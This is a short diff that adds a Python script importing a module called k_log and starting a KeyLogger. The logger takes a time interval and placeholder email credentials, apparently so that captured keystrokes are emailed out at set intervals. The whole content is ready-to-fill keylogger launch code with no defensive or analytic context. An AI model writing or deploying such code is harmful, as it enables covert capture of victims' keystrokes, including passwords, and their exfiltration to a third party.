@@ -1,0 +1,4 @@
+import k_log
+
+my_logger = k_log.KeyLogger("time-interval-in-seconds", "your_email", "your_password")
+my_logger.start()
